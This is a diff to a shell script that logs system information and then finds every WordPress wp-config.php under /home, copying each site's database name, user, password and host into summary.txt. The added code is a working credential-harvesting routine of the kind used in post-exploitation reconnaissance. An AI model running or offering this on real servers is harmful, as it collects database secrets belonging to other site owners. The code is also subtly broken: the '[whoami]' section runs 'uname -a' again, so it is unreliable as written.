@@ -1,2 +1,28 @@
-echo "uname -a" >> summary.txt
+echo "[uname -a]" >> summary.txt
 uname -a >> summary.txt
+
+echo "[whoami]" >> summary.txt
+uname -a >> summary.txt
+
+res=`find /home -name wp-config.php 2>&1 | grep -v "Permission denied"`
+for wpconf in $res
+do
+    echo "[config for site]" $wpconf >>summary.txt
+    filename="$wpconf"
+    while read -r line
+    do
+        name="$line"
+        if [[ $line = *"DB_NAME"* ]]; then
+            echo "$line" >>summary.txt
+        fi
+        if [[ $line = *"DB_USER"* ]]; then
+            echo "$line" >>summary.txt
+        fi
+        if [[ $line = *"DB_PASSWORD"* ]]; then
+            echo "$line" >>summary.txt
+        fi
+        if [[ $line = *"DB_HOST"* ]]; then
+            echo "$line" >>summary.txt
+        fi
+    done < "$filename"
+done
